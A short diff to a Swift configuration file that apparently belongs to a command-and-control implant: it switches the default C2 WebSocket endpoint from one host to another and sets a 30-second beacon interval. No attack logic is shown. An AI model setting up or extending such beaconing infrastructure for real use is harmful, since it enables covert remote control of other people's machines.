@@ -4,7 +4,7 @@ enum Config {
     // ── C2 connection ──────────────────────────────────────────────────────────
     // Edit these values before building, or inject via build settings.
     static let c2WebSocketURL = ProcessInfo.processInfo.environment["C2_WS_URL"]
-        ?? "wss://c2.bixtx.com:3001"
+        ?? "wss://bixtx.onrender.com/agent"
     static let beaconInterval: TimeInterval = Double(
         ProcessInfo.processInfo.environment["BEACON_INTERVAL"] ?? "30"
     ) ?? 30
